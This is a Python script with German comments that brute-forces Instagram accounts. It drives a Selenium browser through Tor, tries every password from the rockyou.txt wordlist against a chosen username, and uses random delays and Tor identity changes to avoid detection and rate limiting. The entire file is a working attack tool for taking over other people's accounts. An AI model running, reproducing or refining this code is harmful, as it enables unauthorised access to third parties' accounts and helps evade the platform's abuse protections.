import sys
import logging
import time
import random
import requests

from browser.run_browser import BrowserSession  # Deine BrowserSession-Klasse
from proxy import TorProxy  # Deine TorProxy-Klasse
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException

# Logging Setup
logger = logging.getLogger(__name__)
if not logger.handlers:
    logger.setLevel(logging.DEBUG)  # Sehr detailliertes Logging
    formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
    sh = logging.StreamHandler()
    sh.setFormatter(formatter)
    logger.addHandler(sh)


def accept_cookies(driver):
    """
    Wartet auf den Cookie-Accept-Button und klickt ihn, falls vorhanden.
    """
    try:
        logger.debug("Suche Cookie-Accept-Button...")
        cookie_button = WebDriverWait(driver, 5).until(
            EC.element_to_be_clickable(
                (By.XPATH, "/html/body/div[3]/div[1]/div/div[2]/div/div/div/div/div[2]/div/button[1]")
            )
        )
        cookie_button.click()
        logger.info("Cookie-Banner akzeptiert.")
    except TimeoutException:
        logger.info("Kein Cookie-Banner gefunden.")


def instagram_login_via_browser(session: BrowserSession, username: str, password: str) -> bool:
    driver = session.driver
    logger.info(f"Öffne Instagram Login-Seite für Benutzer '{username}'")
    driver.get("https://www.instagram.com/accounts/login/")

    accept_cookies(driver)

    try:
        logger.debug("Warte auf Username-Eingabefeld...")
        user_input = WebDriverWait(driver, 15).until(
            EC.presence_of_element_located((By.NAME, "username"))
        )
        user_input.clear()
        user_input.send_keys(username)
        logger.debug("Username eingegeben.")

        pass_input = driver.find_element(By.NAME, "password")
        pass_input.clear()
        pass_input.send_keys(password)
        logger.debug("Passwort eingegeben.")
        pass_input.send_keys(Keys.RETURN)
        logger.info("Login-Formular abgeschickt, warte 5 Sekunden...")
        time.sleep(5)  # Wichtige Pause, um Instagram Reaktionen abzuwarten

        # Abwarten auf URL-Änderung oder Fehlernachricht
        logger.debug("Warte auf Antwort von Instagram (URL oder Fehlermeldungen)...")
        WebDriverWait(driver, 20).until(
            lambda d: "instagram.com" in d.current_url or
                      d.find_elements(By.XPATH, "//*[contains(text(),'Sorry, your password was incorrect')]") or
                      d.find_elements(By.XPATH, "//*[contains(text(),'The username you entered doesn’t belong to an account')]") or
                      d.find_elements(By.XPATH, "//*[contains(text(),'Check your internet connection')]")
        )
        current_url = driver.current_url
        logger.info(f"Nach Login Versuch aktuelle URL: {current_url}")

        # Prüfen auf Fehlermeldungen im Seiteninhalt
        if driver.find_elements(By.XPATH, "//*[contains(text(),'Sorry, your password was incorrect')]"):
            logger.warning("Falsches Passwort erkannt.")
            return False

        if driver.find_elements(By.XPATH, "//*[contains(text(),'The username you entered doesn’t belong to an account')]"):
            logger.warning("Benutzername existiert nicht.")
            return False

        if "challenge" in current_url:
            logger.warning("Login-Challenge erkannt (Captcha etc.).")
            return False

        if "two_factor" in current_url:
            logger.warning("Zwei-Faktor-Authentifizierung erforderlich.")
            return False

        # Prüfen, ob man noch auf der Loginseite ist (dann kein Erfolg)
        if ("accounts/login" in current_url or "accounts/password/reset" in current_url):
            logged_in_elements = driver.find_elements(By.XPATH,
                                                      "//a[contains(@href,'/accounts/logout') or contains(text(),'Abmelden')] | "
                                                      "//div[contains(@aria-label, 'Profil')] | "
                                                      "//img[contains(@alt, 'Profilbild')]"
                                                      )
            logger.debug(f"Gefundene Profil-/Logout-Elemente nach Login: {len(logged_in_elements)}")
            if logged_in_elements:
                logger.info("Profil-/Logout-Element erkannt – Login erfolgreich trotz Login-URL.")
                return True
            else:
                logger.warning("Login fehlgeschlagen, auf Loginseite geblieben und keine Profil-/Logout-Elemente gefunden.")
                return False

        logger.info("Login erfolgreich!")
        return True

    except Exception as e:
        logger.error(f"Fehler beim Login-Versuch: {e}")
        return False


def load_passwords(path):
    try:
        logger.info(f"Lade Passwörter aus Datei: {path}")
        with open(path, "r", encoding="utf-8", errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]
        logger.info(f"{len(passwords)} Passwörter geladen.")
        return passwords
    except Exception as e:
        logger.error(f"Fehler beim Laden der Passwortdatei: {e}")
        sys.exit(1)


def wait_random(min_seconds=5, max_seconds=15):
    wait_time = random.uniform(min_seconds, max_seconds)
    logger.debug(f"Warte {wait_time:.2f} Sekunden, um Erkennung zu vermeiden.")
    time.sleep(wait_time)


def is_ip_anonymous(tor: TorProxy):
    ip = tor.get_exit_ip()
    if ip is None:
        logger.warning("Tor Exit-IP konnte nicht ermittelt werden.")
        return False
    logger.info(f"Aktuelle Tor Exit-IP: {ip}")
    return True


def get_public_ip():
    try:
        response = requests.get("https://api.ipify.org")
        ip = response.text.strip()
        logger.info(f"Öffentliche IP: {ip}")
        return ip
    except Exception as e:
        logger.error(f"Fehler bei IP-Abfrage: {e}")
        return None


def main():
    tor = TorProxy()

    if tor.is_tor_running():
        logger.info("Tor läuft bereits.")
    else:
        logger.info("Tor läuft nicht, starte Tor...")
        if not tor.start_tor():
            logger.error("Fehler beim Starten von Tor.")
            sys.exit(1)

    session = BrowserSession(tor_proxy=tor)
    get_public_ip()
    if not session.start():
        logger.error("Browser konnte nicht gestartet werden.")
        sys.exit(2)

    username = input("Instagram Username: ")
    password_list = load_passwords("/Users/markbaumann/Desktop/rockyou.txt")

    for idx, password in enumerate(password_list, start=1):
        logger.info(f"({idx}/{len(password_list)}) Versuche Passwort: {password}")

        if not is_ip_anonymous(tor):
            logger.info("IP scheint nicht anonym. Versuche Tor Exit-Node zu wechseln...")
            if not tor.new_identity():
                logger.error("Wechsel der Tor-Identität fehlgeschlagen.")
                sys.exit(3)
            logger.info("Warte 10 Sekunden nach Identitätswechsel...")
            time.sleep(10)

        success = instagram_login_via_browser(session, username, password)
        if success:
            logger.info(f"Successfully cracked username '{username}' with password: {password}")
            session.close()
            sys.exit(0)  # Sofort bei Erfolg beenden
        else:
            logger.info("Login fehlgeschlagen, nächster Versuch...")

        wait_random()

    logger.info("Kein Passwort erfolgreich.")
    session.close()
    sys.exit(1)


if __name__ == "__main__":
    main()
